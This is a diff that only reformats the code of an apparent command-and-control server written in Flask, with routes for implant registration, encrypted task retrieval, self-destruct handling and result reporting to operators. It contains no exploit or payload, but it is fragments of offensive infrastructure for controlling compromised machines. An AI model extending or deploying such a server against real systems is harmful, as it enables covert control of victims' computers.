@@ -43,22 +43,21 @@ def implant_authenticated(func: Callable):
         if implant is None:
             return "Unauthorized", 401
 
-    
         if request.get_data():
             try:
                 raw_decrypted = decrypt_b64(
-                implant.implant_pk, implant.server_sk, request.get_data()
-            )
+                    implant.implant_pk, implant.server_sk, request.get_data()
+                )
                 decrypted = json.loads(raw_decrypted)
             except Exception as e:
                 logger.error(traceback.format_exc())
-                logger.error(f"Failed to decrypt request body: {e}: {request.get_data()}")
+                logger.error(
+                    f"Failed to decrypt request body: {e}: {request.get_data()}"
+                )
                 return "Failed to decrypt", 401
             return func(*args, **kwargs, decrypted_body=decrypted)
         else:
             return func(*args, **kwargs)
-
-       
 
     return wrapper
 
@@ -73,7 +72,7 @@ def register():
     # /register
     # Read implant public key from body
     # txid is encrypted and base64 encoded with the value in `registration_password`
-    
+
     """
     {
         "txid": "b64_key_here",
@@ -92,14 +91,17 @@ def register():
     try:
         key = base64.b64decode(C2_PROFILE.globals.registration_password)
         box = nacl.secret.SecretBox(key)
-        implant_public_key_b64 = box.decrypt(implant_public_key_b64_encrypted, encoder=Base64Encoder).decode("utf-8")
+        implant_public_key_b64 = box.decrypt(
+            implant_public_key_b64_encrypted, encoder=Base64Encoder
+        ).decode("utf-8")
         # Remove all null bytes
         implant_public_key_b64 = implant_public_key_b64.replace("\0", "")
     except Exception as e:
         logger.error(f"{e}")
-        logger.error(f"Failed to decrypt implant public key: {implant_public_key_b64_encrypted}")
+        logger.error(
+            f"Failed to decrypt implant public key: {implant_public_key_b64_encrypted}"
+        )
         return "Unauthorized", 401
-
 
     # Check if it's base64
     try:
@@ -209,8 +211,10 @@ def get_task():
                 encryptedResponse = encrypt(
                     load_pubkey(get_implant_by_id(implant_id).implant_pk),
                     load_privkey(get_implant_by_id(implant_id).server_sk),
-                    json.dumps({"status": False, "msg": "Unknown implant"}).encode("utf-8"),
-                ) 
+                    json.dumps({"status": False, "msg": "Unknown implant"}).encode(
+                        "utf-8"
+                    ),
+                )
                 return encryptedResponse, 400
             db.session.delete(to_delete)
             db.session.commit()
@@ -218,7 +222,6 @@ def get_task():
             send_message_to_all_queues(f"Implant {implant_id} self-destructed")
 
         return encryptedResponse
-
 
     # If task is None, return empty task
     encryptedResponse = encrypt(
@@ -277,7 +280,10 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         op = Operator.query.filter_by(username=task.operator_name).first()
         send_message_to_operator(op, f"Task {task.task_id} completed - {task.status}")
         if task.status == ERROR:
-            send_message_to_operator(op, f"Task {task.task_id} error output - {base64.b64decode(task.output).decode('utf-8')}")
+            send_message_to_operator(
+                op,
+                f"Task {task.task_id} error output - {base64.b64decode(task.output).decode('utf-8')}",
+            )
 
         return "OK"
     # If task is None, return empty task
